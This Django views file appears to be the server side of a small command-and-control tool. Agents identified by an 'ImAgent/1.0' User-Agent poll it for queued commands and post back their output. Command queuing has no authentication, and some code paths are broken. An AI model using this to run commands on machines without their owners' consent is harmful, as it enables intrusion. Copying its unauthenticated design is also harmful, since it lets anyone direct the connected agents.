from django.http import HttpResponse
from django.contrib.auth import logout
from django.contrib.auth.decorators import login_required
from django.shortcuts import render, redirect
import random
import string
from .models import *
from django.views.generic import View
import re


def name_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')

    return ip


def create_or_get_user(request):
    clients = Clients.objects.all()
    ip = get_client_ip(request)
    user_agent = request.META.get('HTTP_USER_AGENT')
    print(f"User-Agent: {user_agent}")
    print(f"IP Address: {ip}")

    if 'ImAgent/1.0' in user_agent:
        if not clients.filter(address=ip).exists():
            Clients.objects.create(address=ip, name=name_generator())
            clients = Clients.objects.all()

    agent = clients.filter(address=ip).first()

    if agent:
        agent.last_updated = now()
        agent.save()

    return clients


class IndexView(View):
    def get(self, request):
        clients = create_or_get_user(request)
        context = {
            'clients': clients,
        }
        return render(request, 'server_side/index.html', context)

    def post(self, request):
        clients = create_or_get_user(request).order_by('-last_updated')
        if self.request.POST.get('command'):
            command = Commands.objects.create(receiver=clients[0],
                                              command=self.request.POST.get('command'))
        return redirect('index')


class SendCommand(View):
    def get(self, request):
        clients = create_or_get_user(request)
        ip = get_client_ip(request)
        agent = clients.filter(address=ip).first()
        cmd_execution = Commands.objects.filter(receiver=agent).first()
        if cmd_execution:
            if not cmd_execution.is_executed:
                cmd = f'{cmd_execution.command}, id={cmd_execution.id}'
                return HttpResponse(cmd_execution.command)
        else:
            return HttpResponse("No command to execute.")

    def post(self, request):
        clients = create_or_get_user(request).order_by('-last_updated')
        body = request.body.decode('utf-8')
        ip = get_client_ip(request)
        agent = clients.filter(address=ip).first()
        match = re.search(r'id\s*=\s*(\d+)', body)
        if match:
            cmd_id = int(match.group(1))
            Commands.objects.filter(receiver=agent, id=cmd_id).delete()
        else:
            return HttpResponse("mistake detected. no id sent :|")

        response = re.sub(r'id\s*=\s*(\d+)', '', body)
        return render(request, 'server_side/index.html', context= {
            'response': response,
        })




def logout_view(request):
    logout(request)
    return redirect('login')
